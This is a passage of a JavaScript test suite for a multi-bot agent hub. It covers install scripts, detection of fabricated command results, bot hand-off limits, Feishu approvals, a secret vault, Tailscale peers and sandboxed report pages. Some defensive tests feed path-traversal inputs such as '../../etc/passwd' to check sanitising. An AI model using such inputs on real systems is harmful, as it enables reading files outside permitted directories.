      check('install: while the desktop installs, the panel shows the note, not the (black) live view', /const installing = state\.computer\?\.desktopSetup\?\.state === 'running';/.test(ui) && /!watching \|\| installing \|\|/.test(ui));
      check('install: a domestic mirror only when clearly faster, through its own lists, with a fallback', /pick_mirror\(\)/.test(sh) && /Dir::State::Lists=\/var\/lib\/apt\/desk-mirror-lists/.test(sh) && /a > 2 \* b/.test(sh) && /APT_SRC=""   # the mirror did not work/.test(sh) && /signed-by=/.test(sh));
      check('install: the speed check works with wget too, and elapsed time is the script\'s own', /fetch_time\(\)/.test(sh) && /wget -q -T 20 -O \/dev\/null/.test(sh) && /"elapsed":%s/.test(sh) && /"\$SECONDS"/.test(sh));
      check('install: the Chromium snap downloads while apt installs the rest', /snap install chromium >\/dev\/null 2>&1 &/.test(sh) && /wait "\$SNAP_PID"/.test(sh));
    }
    // Step 11: away from home (Tailscale), and no made-up command results.
    {
      const A = await import('../src/agent.mjs');
      const f = A.looksLikeMadeUpRun;
      check('made-up results: a run reported with no tool call is caught', f('执行这条命令：sudo bash x.sh', '执行完成，输出如下：\n```\nok\n```', true) && f('run `ls /tmp`', 'exit=0', true));
      check('made-up results: ordinary answers and bots that cannot run are left alone', !f('今天天气怎么样', '```js\nconsole.log(1)\n```', true) && !f('执行这条命令', '执行完成', false) && !f('执行一下', '好的，我需要先确认你要执行哪条命令？', true));
      const agentSrc = await readText('../src/agent.mjs');
      check('made-up results: taken back from the chat and retried once, only in a turn that ran nothing', /type: 'message\.retract'/.test(agentSrc) && /!trail\.length && !fabricationNudged/.test(agentSrc));
      const page = await readText('../public/index.html');
      check('made-up results: the page drops the retracted bubble', /case 'message\.retract':/.test(page));
      // Hand-offs: a team works as a chain (chief -> director -> writer), bounded.
      {
        const T = await import('../src/tools.mjs');
        const calls = [];
        const fakeRuntime = { runTurn: async (o) => { calls.push(o); return { status: 'success', turnId: `t${calls.length}`, summary: `done by ${o.botId}` }; } };
        const roster = { chief: { id: 'chief', name: '助理' }, director: { id: 'director', name: '导演' }, writer: { id: 'writer', name: '编剧' }, artist: { id: 'artist', name: '美术' } };
        const reg = T.createRegistry({ workspaceDir: process.cwd(), config: { policy: {} }, getRuntime: () => fakeRuntime });
        const tool = reg.get('bot_message');
        const ctxOf = (botId, depth, chain, budget) => ({ bot: roster[botId], depth, chain, handoffBudget: budget, turnId: 'p', bots: { getBot: async (id) => roster[id] || null } });
        const err = async (p) => { try { await p; return null; } catch (e) { return e.code; } };
        const budget = { left: T.MAX_HANDOFFS };
        const r1 = await tool.run({ botId: 'writer', text: '写分镜' }, ctxOf('director', 1, ['chief', 'director'], budget));
        check('hand-offs: a bot that was handed work can hand parts on (two hops), and gets the reply back', r1.reply === 'done by writer' && calls.at(-1).depth === 2 && calls.at(-1).chain.join('>') === 'chief>director>writer');
        check('hand-offs: no handing back up the chain (it would deadlock)', (await err(tool.run({ botId: 'director', text: 'x' }, ctxOf('writer', 2, ['chief', 'director', 'writer'], budget)))) === 'BOT_IN_CHAIN');
        check('hand-offs: at most 3 levels deep', (await err(tool.run({ botId: 'artist', text: 'x' }, ctxOf('writer', T.MAX_HANDOFF_DEPTH, ['chief', 'director', 'x', 'writer'], budget)))) === 'BOT_DEPTH_EXCEEDED');
        const tight = { left: 1 };
        await tool.run({ botId: 'artist', text: '画' }, ctxOf('director', 1, ['chief', 'director'], tight));
        check('hand-offs: one task has a shared budget of hand-offs', (await err(tool.run({ botId: 'writer', text: 'x' }, ctxOf('director', 1, ['chief', 'director'], tight)))) === 'BOT_HANDOFF_BUDGET' && calls.at(-1).handoffBudget === tight);
      }
      const health = await api('/api/health');
      check('away: the hub reports a Tailscale address field (null when not on a tailnet or loopback-only)', health.status === 200 && 'tailnetUrl' in (health.json || {}));
      const { tailnetAddress } = await import('../src/auth.mjs');
      check('away: tailnet detection does not crash and only returns 100.64/10 addresses', (() => { const a = tailnetAddress(); return a === null || /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(a); })());
      const main = await readText('../desktop/main.mjs');
      check('away: the client falls back to the Tailscale address and carries the pairing over', /async function reachMachine\(url\)/.test(main) && /cookies\.set\(\{\s*url: alt/.test(main) && /const reach = target \? await reachMachine\(target\)/.test(main) && /patchMachine\(url, \{ tailnetUrl/.test(main));
      check('away: a system proxy that does not bypass 100.64/10 is bypassed in this app only; addresses are relearned every few minutes', main.includes('async function tailnetDirect()') && main.includes('100.64.0.0/10;*.local') && main.includes('for (const m of readMachines()) learnTailnet(m.url)'));
      check('away: the page knows which machine it is when opened through Tailscale', /m\.tailnetUrl === location\.origin/.test(page) && /id="pair-tailnet"/.test(page));
    }
    let none = '';
    try { await MD.generateImages(null, { prompt: 'x' }, { workspaceDir: ws }); } catch (err) { none = err.code; }
    check('generation: not configured says where to set it up', none === 'IMAGE_NOT_CONFIGURED');
    const put = await api('/api/media/image', { method: 'PUT', body: { service: 'siliconflow', apiKey: 'sk-gen-secret-1' } });
    const got = await api('/api/media');
    const bad = await api('/api/media/image', { method: 'PUT', body: { service: 'nope' } });
    check('generation: settings save, the key never comes back, bad service refused', put.status === 200 && got.json?.image?.hasKey && got.json.image.source === 'own' && !JSON.stringify(got.json).includes('sk-gen-secret-1') && bad.status === 400);
    await api('/api/media/image', { method: 'PUT', body: { apiKey: '' } });
  }
  // Feishu: frames, pairing, a message runs a turn, the answer goes back, approve by reply.
  {
    const os = await import('node:os');
    const fsx = await import('node:fs');
    const FS = await import('../src/feishu.mjs');
    const { EventBus } = await import('../src/store.mjs');
    const frame = { SeqID: 7n, LogID: 9n, service: 3, method: 1, headers: [{ key: 'type', value: 'event' }, { key: 'message_id', value: 'm1' }], payload: Buffer.from('{"a":1}') };
    const back = FS.decodeFrame(FS.encodeFrame(frame));
    check('feishu: protobuf frames round-trip', back.SeqID === 7n && back.service === 3 && back.method === 1 && back.headers[1].value === 'm1' && back.payload.toString() === '{"a":1}');
    const dir = fsx.mkdtempSync(path.join(os.tmpdir(), 'feishu-'));
    const sent = [];
    const fakeFetch = async (url, init = {}) => {
      const body = init.body && typeof init.body === 'string' ? JSON.parse(init.body) : null;
      const ok = (data) => ({ ok: true, status: 200, json: async () => ({ code: 0, ...data }) });
      if (url.includes('tenant_access_token')) return ok({ tenant_access_token: 't-1', expire: 7200 });
      if (url.includes('/im/v1/messages')) { const c = JSON.parse(body.content); sent.push(c.zh_cn?.content?.[0]?.[0]?.text || JSON.stringify(c)); return ok({ data: {} }); }
      return ok({ data: {} });
    };
    const bus = new EventBus();
    const turns = [];
    const decided = [];
    const fs1 = FS.createFeishu({
      file: path.join(dir, 'feishu.json'), bus, workspaceDir: dir, fetchImpl: fakeFetch,
      runtime: { runTurn: async (t) => { turns.push(t); return t; } },
      approvals: { resolve: (id, d) => decided.push([id, d]) },
      getBots: () => [{ id: 'chief', primary: true }],
      machineName: () => '测试机',
    });
    await fs1.load();
    await fs1.update({ appId: 'cli_x', appSecret: 'sec-1' });
    const code = fs1.view().pairCode;
    let n = 0;
    const say = async (text, type = 'text') => {
      n += 1;
      fs1._handleFrame(FS.encodeFrame({ method: 1, headers: [{ key: 'type', value: 'event' }, { key: 'message_id', value: `f${n}` }], payload: Buffer.from(JSON.stringify({ header: { event_id: `e${n}`, event_type: 'im.message.receive_v1' }, event: { sender: { sender_id: { open_id: 'ou_1' }, sender_type: 'user' }, message: { message_id: `om_${n}`, chat_id: 'oc_1', chat_type: 'p2p', message_type: type, content: JSON.stringify({ text }) } } })) }));
      await new Promise((r) => setTimeout(r, 30));
    };
    await say('帮我看看磁盘');
    check('feishu: someone not paired is told how, and nothing runs', turns.length === 0 && /配对码/.test(sent.at(-1) || ''));
    await say(`配对 ${code}`);
    check('feishu: the pairing code pairs that person, once', fs1.view().users.length === 1 && fs1.view().pairCode !== code && /已连接到「测试机」/.test(sent.at(-1) || ''));
    await say('帮我看看磁盘');
    const turn = turns.at(-1);
    check('feishu: a paired message runs a turn for the primary bot', turns.length === 1 && turn.botId === 'chief' && turn.source === 'feishu' && /帮我看看磁盘/.test(turn.text));
    bus.emit({ type: 'approval.request', turnId: turn.turnId, botId: 'chief', botName: '助理', approvalId: 'ap9', tool: 'shell', args: { command: 'df -h' } });
    await new Promise((r) => setTimeout(r, 30));
    const asked = /回复「批准」或「拒绝」/.test(sent.at(-1) || '');
    await say('批准');
    check('feishu: an approval is asked in Feishu and a reply of 批准 approves it', asked && decided.length === 1 && decided[0][0] === 'ap9' && decided[0][1] === 'approved' && turns.length === 1);
    bus.emit({ type: 'message', turnId: turn.turnId, botId: 'chief', text: '磁盘还剩 120 GB。' });
    bus.emit({ type: 'turn.end', turnId: turn.turnId, botId: 'chief', summary: '磁盘还剩 120 GB。' });
    await new Promise((r) => setTimeout(r, 50));
    check('feishu: the answer goes back to Feishu', sent.some((t) => /磁盘还剩 120 GB/.test(t)));
    const before = turns.length;
    fs1._handleFrame(FS.encodeFrame({ method: 1, headers: [{ key: 'type', value: 'event' }], payload: Buffer.from(JSON.stringify({ header: { event_id: `e${n}`, event_type: 'im.message.receive_v1' }, event: { sender: { sender_id: { open_id: 'ou_1' } }, message: { message_id: 'dup', chat_id: 'oc_1', message_type: 'text', content: '{"text":"again"}' } } })) }));
    await new Promise((r) => setTimeout(r, 30));
    check('feishu: a redelivered event runs once; the secret never shows', turns.length === before && !JSON.stringify(fs1.view()).includes('sec-1') && fs1.view().hasSecret);
    fs1.stop();
  }
  // A model per bot: extra models with their own keys; a bot without one (or
  // whose model was deleted) uses the machine's default.
  {
    const KEY = 'sk-model-test-4471';
    const made = await api('/api/models', { method: 'POST', body: { provider: 'deepseek', model: 'deepseek-reasoner', label: '推理', apiKey: KEY } });
    const listed = await api('/api/models');
    const id = made.json?.model?.id;
    check('models: added with its own key; the key never comes back', made.status === 200 && id && made.json.model.hasKey && listed.json?.models?.some((m) => m.id === id) && !JSON.stringify(listed.json).includes(KEY) && !JSON.stringify(made.json).includes(KEY));
    const bad = await api('/api/models', { method: 'POST', body: { provider: 'nope', model: 'x' } });
    const mock = await api('/api/models', { method: 'POST', body: { provider: 'mock', model: 'x' } });
    check('models: unknown or demo providers are refused', bad.status === 400 && mock.status === 400);
    const patched = await api('/api/bots/chief', { method: 'PATCH', body: { model: id } });
    const M = await import('../src/models.mjs');
    const client = await M.modelForBot(patched.json?.bot);
    check('models: a bot keeps its model and turns use it', patched.json?.bot?.model === id && client?.model === 'deepseek-reasoner' && client?.provider === 'deepseek');
    check('models: no model of its own means the default', (await M.modelForBot({ model: '' })) === null);
    const kept = await api(`/api/models/${id}`, { method: 'PUT', body: { label: '推理强', apiKey: '' } });
    check('models: an update with an empty key keeps the key', kept.json?.model?.label === '推理强' && kept.json?.model?.hasKey);
    const gone = await api(`/api/models/${id}`, { method: 'DELETE' });
    check('models: deleting one sends its bots back to the default', gone.status === 200 && (await M.modelForBot({ model: id })) === null);
    await api('/api/bots/chief', { method: 'PATCH', body: { model: '' } });
  }
  // Vault: values go in, never come out of any route; encrypted on disk.
  {
    const fsx = await import('node:fs');
    const SECRET = 'Zp4!vault-77';
    const made = await api('/api/vault', { method: 'POST', body: { name: '测试站', site: 'https://login.example.com', values: { 账号: 'alice', 密码: SECRET } } });
    const listed = await api('/api/vault');
    const onDisk = fsx.readFileSync(path.join(home, 'data', 'vault.json'), 'utf8');
    check('vault: saved, listed by name and field only, encrypted on disk', made.status === 200 && JSON.stringify(listed.json).includes('测试站') && !JSON.stringify(listed.json).includes(SECRET) && !JSON.stringify(made.json).includes(SECRET) && !onDisk.includes(SECRET) && !onDisk.includes('alice'));
    const v = await import('../src/vault.mjs');
    const viaAlias = await v.revealVault('测试站', 'password');
    await api(`/api/vault/${made.json.entry.id}`, { method: 'PUT', body: { values: { 账号: 'bob', 密码: '' } } });
    const kept = await v.revealVault('测试站', '密码');
    const user = await v.revealVault('测试站', 'username');
    check('vault: field names are forgiving; an empty value on update keeps the old one', viaAlias.value === SECRET && kept.value === SECRET && user.value === 'bob');
    const gone = await api(`/api/vault/${made.json.entry.id}`, { method: 'DELETE' });
    const after = await api('/api/vault');
    check('vault: delete removes it', gone.status === 200 && !(after.json?.entries || []).length);
  }
  // Sidebar status: working / needs you / new result, per bot and per group.
  {
    const os = await import('node:os');
    const fsx = await import('node:fs');
    const { EventBus } = await import('../src/store.mjs');
    const { createAttention } = await import('../src/attention.mjs');
    const dir = fsx.mkdtempSync(path.join(os.tmpdir(), 'att-'));
    const file = path.join(dir, 'attention.json');
    const bus = new EventBus();
    const att = createAttention({ file, bus });
    await att.load();
    let notices = 0;
    bus.subscribe((e) => { if (e.type === 'attention.changed') notices += 1; });
    const tick = () => new Promise((r) => setTimeout(r, 400));
    bus.emit({ type: 'turn.start', botId: 'a', turnId: 't1' });
    bus.emit({ type: 'turn.start', botId: 'b', groupId: 'g1', turnId: 't2' });
    let s = att.snapshot();
    check('status: a running turn shows as working, a group member turn counts for the group', s.items['bot:a']?.working && s.items['group:g1']?.working && !s.items['bot:b'] && s.working === 2);
    bus.emit({ type: 'approval.request', botId: 'a', turnId: 't1', approvalId: 'ap1' });
    s = att.snapshot();
    check('status: an open approval card means "needs you"', s.items['bot:a'].needsYou && s.items['bot:a'].approvals === 1 && s.needsYou === 1);
    bus.emit({ type: 'approval.resolved', botId: 'a', turnId: 't1', approvalId: 'ap1' });
    bus.emit({ type: 'turn.end', botId: 'a', turnId: 't1', summary: 'done' });
    bus.emit({ type: 'turn.end', botId: 'b', groupId: 'g1', turnId: 't2', summary: '等你填写「测试」的登录信息', waitingFor: 'login' });
    s = att.snapshot();
    check('status: a finished turn is a new result; waiting for a login still needs you', !s.items['bot:a'].working && s.items['bot:a'].unread && !s.items['bot:a'].needsYou && s.items['group:g1'].needsYou && s.items['group:g1'].waiting?.kind === 'login');
    att.seen('bot:a');
    s = att.snapshot();
    check('status: looking at the chat clears "new result"; bad keys are refused', !s.items['bot:a'] && att.seen('../x') === false);
    await tick();
    const again = createAttention({ file, bus: new EventBus() });
    await again.load();
    const s2 = again.snapshot();
    check('status: a wait for the human and what was seen survive a restart; working does not', s2.items['group:g1']?.needsYou && !s2.items['group:g1'].working && !s2.items['bot:a']);
    bus.emit({ type: 'turn.start', botId: 'b', groupId: 'g1', turnId: 't3' });
    check('status: the next turn in that chat ends the wait', !att.snapshot().items['group:g1'].needsYou);
    check('status: changes are announced (batched) for the sidebar', notices >= 1 && notices < 8);
    const r = await api('/api/attention');
    const bad = await api('/api/attention/seen', { method: 'POST', body: { key: 'nope' } });
    const ok = await api('/api/attention/seen', { method: 'POST', body: { key: 'bot:chief' } });
    check('status: routes answer and check their input', r.status === 200 && typeof r.json?.needsYou === 'number' && bad.status === 400 && ok.status === 200);
  }
  // Step 12: bots on different machines work together (a stand-in peer machine here).
  {
    const fsx = await import('node:fs');
    const { EventBus } = await import('../src/store.mjs');
    const { createAttention } = await import('../src/attention.mjs');
    const { createPeers } = await import('../src/peers.mjs');
    const T = await import('../src/tools.mjs');
    // Badges of deleted bots and groups go away (now and from older versions).
    const adir = fsx.mkdtempSync(path.join(os.tmpdir(), 'att12-'));
    const abus = new EventBus();
    const att = createAttention({ file: path.join(adir, 'a.json'), bus: abus });
    await att.load();
    abus.emit({ type: 'turn.end', botId: 'gone', turnId: 'x', summary: 'ok' });
    abus.emit({ type: 'turn.end', botId: 'old', turnId: 'y', summary: 'ok' });
    abus.emit({ type: 'roster.changed', scope: 'bots', action: 'delete', botId: 'gone' });
    const pruned = att.prune(['bot:keep']);
    check('badges: a deleted bot loses its badge; leftovers of older versions are pruned', !att.snapshot().items['bot:gone'] && !att.snapshot().items['bot:old'] && pruned === 1);
    // A stand-in machine "ubuntu" with one bot, behind a pairing token.
    const TOKEN = 'peer-token-123456';
    const peerWs = fsx.mkdtempSync(path.join(os.tmpdir(), 'peer-ws-'));
    fsx.writeFileSync(path.join(peerWs, 'cut.txt'), 'final cut');
    const seen = [];
    const peerSrv = http.createServer(async (req, res) => {
      const chunks = []; for await (const c of req) chunks.push(c);
      const body = Buffer.concat(chunks);
      seen.push({ method: req.method, url: req.url, auth: req.headers.authorization, body });
      const send = (code, obj) => { res.writeHead(code, { 'content-type': 'application/json' }); res.end(JSON.stringify(obj)); };
      if (req.headers.authorization !== 'Bearer ' + TOKEN) return send(401, { error: { code: 'UNPAIRED' } });
      if (req.url === '/api/health') return send(200, { ok: true, version: 'test-peer' });
      if (req.method === 'POST' && req.url === '/api/pairing/link') {
        return send(200, { links: [], url: 'http://127.0.0.1:1/?pair=TESTTOKEN', expiresAt: new Date(Date.now() + 600000).toISOString() });
      }
      if (req.url === '/api/bots') return send(200, [{ id: 'bot-ed', name: '剪辑', role: '剪视频' }]);      if (req.method === 'POST' && req.url === '/api/bots/bot-ed/message') return send(200, { turnId: 'turn-77' });
      if (req.url.startsWith('/api/bots/bot-ed/messages')) return send(200, [{ turnId: 'turn-77', role: 'assistant', text: '剪好了：cut.txt' }, { turnId: 'turn-77', role: 'status', status: 'success' }]);
      if (req.url === '/api/uploads') return send(200, { path: 'uploads/day/' + decodeURIComponent(req.headers['x-file-name']) });
      if (req.url.startsWith('/api/workspace/file')) { res.writeHead(200); return res.end(fsx.readFileSync(path.join(peerWs, 'cut.txt'))); }
      send(404, {});
    });
    await new Promise((r) => peerSrv.listen(0, '127.0.0.1', r));
    const peerUrl = 'http://127.0.0.1:' + peerSrv.address().port;
    const pdir = fsx.mkdtempSync(path.join(os.tmpdir(), 'peers-'));
    const peers = createPeers({ file: path.join(pdir, 'peers.json') });
    await peers.load();
    const listed = await peers.set([{ name: 'ubuntu', url: peerUrl, token: TOKEN }, { name: 'bad', url: 'ftp://x', token: TOKEN }, { name: 'short', url: peerUrl, token: 'x' }]);
    check('peers: the list keeps valid machines only and never hands tokens back', listed.length === 1 && listed[0].name === 'ubuntu' && !JSON.stringify(listed).includes(TOKEN) && peers.find('UBU')?.name === 'ubuntu');
    const dead = createPeers({ file: path.join(pdir, 'dead.json') });
    await dead.set([{ name: 'away', url: 'http://127.0.0.1:1', tailnetUrl: peerUrl, token: TOKEN }]);
    const viaTail = await dead.json(dead.find('away'), 'GET', '/api/bots');
    check('peers: a machine not answering on the LAN is reached on its Tailscale address', Array.isArray(viaTail) && viaTail[0].id === 'bot-ed');
    // The machine list probes both addresses at once (a hanging LAN address must
    // not hide an answering Tailscale address), so a single-address call exists.
    const probe = (base) =>
      dead
        .call(dead.find('away'), 'GET', '/api/bots', { base, timeoutMs: 1500 })
        .then((res) => res.ok)
        .catch(() => false);
    check(
      'machines: one address can be probed on its own (LAN down, Tailscale up)',
      (await probe('http://127.0.0.1:1')) === false && (await probe(peerUrl)) === true,
    );
    const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'ws12-'));
    fsx.writeFileSync(path.join(ws, 'script.md'), '分镜');
    const reg = T.createRegistry({ workspaceDir: ws, config: { policy: {} }, getRuntime: () => null, getPeers: () => peers });
    const me = { id: 'director', name: '导演', tools: ['bot_message'] };
    const ctx = { bot: me, depth: 1, chain: ['chief', 'director'], handoffBudget: { left: 5 }, workspaceDir: ws, bots: { listBots: async () => [me], getBot: async () => null } };
    const lst = await reg.get('bot_list').run({}, ctx);
    check('peers: bot_list shows the bots on the other machines', lst.otherMachines?.[0]?.machine === 'ubuntu' && lst.otherMachines[0].bots[0].name === '剪辑');
    const sent = await reg.get('file_send').run({ machine: 'ubuntu', path: 'script.md' }, ctx);
    check('peers: file_send copies a workspace file to the other machine', sent.path === 'uploads/day/script.md' && seen.some((s) => s.url === '/api/uploads' && s.body.toString() === '分镜'));
    const r = await reg.get('bot_message').run({ machine: 'ubuntu', botId: '剪辑', text: '剪片' }, ctx);
    const posted = JSON.parse(seen.find((s) => s.url === '/api/bots/bot-ed/message').body.toString());
    const host = os.hostname();
    check('peers: bot_message hands work to a bot on another machine by name and brings its reply back', r.reply === '剪好了：cut.txt' && r.machine === 'ubuntu' && r.status === 'success');
    check('peers: the chain, depth and budget travel with it (this machine tags its own bots)', posted.handoff.depth === 2 && posted.handoff.chain.join('>') === 'chief@' + host + '>director@' + host + '>bot-ed' && posted.handoff.budgetLeft === 4 && ctx.handoffBudget.left === 4);
    const got = await reg.get('file_fetch').run({ machine: 'ubuntu', path: 'cut.txt' }, ctx);
    check('peers: file_fetch brings a result back into this workspace', got.path.startsWith('from-machines/ubuntu/') && fsx.readFileSync(path.join(ws, got.path), 'utf8') === 'final cut');
    const err = async (p) => { try { await p; return null; } catch (e) { return e.code; } };
    const e1 = await err(reg.get('bot_message').run({ machine: 'nope', botId: 'x', text: 'x' }, ctx));
    const e2 = await err(reg.get('bot_message').run({ machine: 'ubuntu', botId: 'x', text: 'x' }, { ...ctx, depth: T.MAX_HANDOFF_DEPTH }));
    await peers.set([{ name: 'ubuntu', url: peerUrl, token: 'wrong-token-999' }]);
    const e3 = await err(reg.get('file_send').run({ machine: 'ubuntu', path: 'script.md' }, ctx));
    check('peers: unknown machine, depth limit and a wrong token are refused clearly', e1 === 'PEER_NOT_FOUND' && e2 === 'BOT_DEPTH_EXCEEDED' && e3 === 'PEER_UNAUTHORIZED', [e1, e2, e3].join(','));
    check('peers: file tools come with bot_message', reg.isGranted(me, 'file_send') && reg.isGranted(me, 'file_fetch') && !reg.isGranted({ tools: [] }, 'file_fetch'));
    // The hub's machine list has to authenticate its probe with the peer token.
    // (peers.list() hides tokens; using it for the probe reported everything offline.)
    await api('/api/peers', { method: 'PUT', body: { peers: [{ name: 'ubuntu', url: peerUrl, tailnetUrl: peerUrl, token: TOKEN }] } });
    const live = await api('/api/machines');
    const ubuntuRow = (live.json?.machines || []).find((m) => m.name === 'ubuntu');
    check(
      'machines: a peer that answers is listed online (the probe authenticates)',
      Boolean(ubuntuRow) && ubuntuRow.online === true,
      JSON.stringify(live.json?.machines),
    );
    await api('/api/peers', { method: 'PUT', body: { peers: [] } });
    peerSrv.close();
    // The hub routes: the list goes in, tokens never come out.
    const put = await api('/api/peers', { method: 'PUT', body: { peers: [{ name: 'box', url: 'http://10.0.0.9:4390', token: 'secret-peer-token-1' }] } });
    const back = await api('/api/peers');
    check('peers: PUT/GET /api/peers, tokens never come back', put.status === 200 && back.json?.peers?.[0]?.name === 'box' && !JSON.stringify(back.json).includes('secret-peer-token-1'));
    await api('/api/peers', { method: 'PUT', body: { peers: [] } });
    const srv = await readText('../src/server.mjs');
    check('peers: work from another machine keeps the chain limits and says where it came from', srv.includes('Math.min(3, Math.max(1, Number(h.depth)') && srv.includes("source: h ? 'peer' : 'chat'"));
    const main = await readText('../desktop/main.mjs');
    check('peers: the client hands every hub the other machines, at start, every 10 min and on changes', main.includes('async function sharePeers()') && main.includes("'/api/peers', body)") && main.includes('{ peers: others }') && main.includes('sharePeersTimer = setTimeout') && main.includes('setInterval(() => sharePeers()'));
    const agentSrc = await readText('../src/agent.mjs');
    const vj = await readText('../src/videojobs.mjs');
    check('peers: bots are told teammates work on other machines; delegated videos report to the origin bot', agentSrc.includes('function peersLine(peers, canHandOff)') && vj.includes('reportTo') && srv.includes('const tellUpstream = async'));
  }
  // Step 13: the page library (reports, dashboards a bot makes as web pages).
  {
    const fsx = await import('node:fs');
    const PG = await import('../src/pages.mjs');
    const T = await import('../src/tools.mjs');
    const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'pages-'));
    fsx.mkdirSync(path.join(ws, 'artifacts'));
    fsx.writeFileSync(path.join(ws, 'artifacts', 'chart.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 1, 2, 3]));
    fsx.writeFileSync(path.join(os.tmpdir(), 'outside-secret.png'), 'nope');
    const pages = PG.createPages({ workspaceDir: ws });
    const reg = T.createRegistry({ workspaceDir: ws, config: { policy: {} }, getRuntime: () => null, getPages: () => pages });
    const bot = { id: 'b1', name: '分析师', tools: [] };
    const a = await reg.get('page_save').run({ title: 'Weekly Sales 周报', html: '<h1>周报</h1><img src="../artifacts/chart.png"><img src="../../outside-secret.png">' }, { bot, workspaceDir: ws });
    const html = fsx.readFileSync(path.join(ws, a.path), 'utf8');
    check('pages: page_save keeps a page under pages/, wrapped into a whole document with its title', a.path === 'pages/weekly-sales.html' && /<!doctype html>/i.test(html) && html.includes('<title>Weekly Sales 周报</title>') && !a.updated);
    check('pages: workspace images are embedded; files outside the workspace are not', html.includes('data:image/png;base64,') && html.includes('src="../../outside-secret.png"'));
    const b = await reg.get('page_save').run({ title: 'Weekly Sales 周报', html: '<h1>v2</h1>' }, { bot, workspaceDir: ws });
    const c = await reg.get('page_save').run({ title: 'Weekly Sales 库存', html: '<p>x</p>' }, { bot, workspaceDir: ws });
    const d = await reg.get('page_save').run({ title: '客户跟进表', html: '<p>y</p>' }, { bot, workspaceDir: ws });
    const e = await reg.get('page_save').run({ title: 'anything', html: '<html><head></head><body>z</body></html>', name: 'Weekly Sales' }, { bot, workspaceDir: ws });
    check('pages: the same title updates its page; a different title never overwrites it; a Chinese title gets a dated name', b.updated && b.name === 'weekly-sales' && c.name !== 'weekly-sales' && /^page-\d{4}-\d\d-\d\d-[a-z0-9]{4}$/.test(d.name));
    check('pages: an explicit name updates that page, and a full document gets a title added', e.name === 'weekly-sales' && e.updated && fsx.readFileSync(path.join(ws, e.path), 'utf8').includes('<title>anything</title>'));
    const listed = await pages.list();
    check('pages: the library lists every page with title and who made it', listed.length === 3 && listed.find((p) => p.name === d.name)?.title === '客户跟进表' && listed.every((p) => p.botName === '分析师'));
    const err = async (p) => { try { await p; return null; } catch (x) { return x.code; } };
    check('pages: empty pages are refused; every bot may save pages', (await err(reg.get('page_save').run({ title: 'x', html: '  ' }, { bot, workspaceDir: ws }))) === 'PAGE_EMPTY' && reg.isGranted({ tools: [] }, 'page_save'));
    check('pages: names are safe file names only', PG.pageName('../../etc/passwd') === 'etc-passwd' && PG.pageName('A b.HTML') === 'a-b' && (await pages.read('../x')) === null);
    // Routes: listed, served sandboxed (its scripts cannot use the app's login), deleted.
    const hubPages = (await api('/api/pages'));
    check('pages: GET /api/pages answers', hubPages.status === 200 && Array.isArray(hubPages.json?.pages));
    const srv = await readText('../src/server.mjs');
    check('pages: a page is served with a sandbox policy (opaque origin) and can be downloaded or deleted', PG.PAGE_HEADERS['content-security-policy'].startsWith('sandbox allow-scripts') && !PG.PAGE_HEADERS['content-security-policy'].includes('allow-same-origin') && srv.includes("route('DELETE', /^\\/api\\/pages\\/") && srv.includes("query.get('download')"));
    const page = await readText('../public/index.html');
    check('pages: a page named in a reply becomes a card; it opens in a sandboxed frame; Settings has the library', page.includes("out.push({ path: p, page: m[1]") && /<iframe sandbox="allow-scripts allow-popups[^"]*"/.test(page) && !/<iframe sandbox="[^"]*allow-same-origin/.test(page) && page.includes('id="sec-pages"') && page.includes('data-set-target="sec-pages"'));
    // Results reach the human, not just "done".
    const agentSrc = await readText('../src/agent.mjs');
    const toolSrc = await readText('../src/tools.mjs');
    check('results: the last message must carry the result itself (content, paths), never only "done"', agentSrc.includes('Never only "done"') && toolSrc.includes('the summary IS what the human reads') && toolSrc.includes('file_fetch what the human needs, then tell them'));
    // Tailscale key when adding a Linux machine.
    const sh = await readText('../hub/setup-linux.sh');
    const rm = await readText('../src/remote.mjs');
    check('tailscale key: sent over SSH stdin into a private file, never on a command line', rm.includes("'umask 077; cat > /tmp/desk-tailscale.key && test -s /tmp/desk-tailscale.key', { stdin:") && !/tskey.*\$\{tailscaleKey\}.*bash/.test(rm) && rm.includes("--tailscale-key-file /tmp/desk-tailscale.key"));
    const tsl = await readText('../hub/tailscale-linux.sh');
    const setupWin = await readText('../hub/setup-windows.ps1');
    const funnelSrc = await readText('../src/funnel.mjs');
    check('funnel on Linux: on Access denied (operator) the hub makes its own account the Tailscale operator once (sudo -n) and tries again', funnelSrc.includes("run('sudo', ['-n', bin, 'set', `--operator=${user}`], 15000)") &&funnelSrc.includes("await runAsOperator(bin, ['funnel', '--bg', String(port)], 15000)"));
    check('tailscale key: Linux waits for the package manager (desktop install runs at the same time) and retries', tsl.includes('wait_pkg') && tsl.includes('for attempt in 1 2 3; do') && tsl.includes('pgrep -x apt-get'));
    check('tailscale key: Windows installs Tailscale in the foreground (an SSH session kills background children) and reports DESK_TS', setupWin.includes("Start-Process powershell.exe -ArgumentList $tsArgs -WindowStyle Hidden -Wait") && setupWin.includes('Write-Output $tsLine'));
    check('tailscale key: the script installs Tailscale in the background, reads the key from a root-only file and removes it', sh.includes('--tailscale-key-file)') && tsl.includes('tailscale up --auth-key="file:$KEY"') && tsl.includes("trap 'shred -u \"$KEY\"") && sh.includes('desk-tailscale-setup') && sh.includes('$APP_DIR/hub/tailscale-linux.sh'));
    const { createProvisioner } = await import('../src/remote.mjs').catch(() => ({}));
    if (typeof createProvisioner === 'function') {
      let code = '';
      try { createProvisioner({}).start({ host: '10.0.0.5', username: 'u', password: 'p', tailscaleKey: 'not-a-key' }); } catch (x) { code = x.code; }
      check('tailscale key: a key that is not tskey-… is refused before anything starts', code === 'REMOTE_BAD_TAILSCALE_KEY', code);
      let apiCode = '';
      try { createProvisioner({}).start({ host: '10.0.0.5', username: 'u', password: 'p', tailscaleKey: 'tskey-api-abcdefghij-XYZ' }); } catch (x) { apiCode = x.code + ':' + x.message; }
      check('tailscale key: an API access token (tskey-api-) is refused with what to make instead; only tskey-auth- passes', apiCode.startsWith('REMOTE_BAD_TAILSCALE_KEY') && apiCode.includes('Generate auth key'));
    }
    check('tailscale key: optional field in the add-machine form', page.includes('id="vnc-ts-key"') && page.includes('tailscaleKey: $(\'vnc-ts-key\').value.trim()'));
  }
  // Step 14: the daily briefing, and routines that only speak up when something changed.
  {
    const B = await import('../src/briefing.mjs');
    const now = Date.parse('2026-11-10T08:30:00Z');
    const h = (n) => new Date(now - n * 3600 * 1000).toISOString();
    const sessions = {
      chief: [
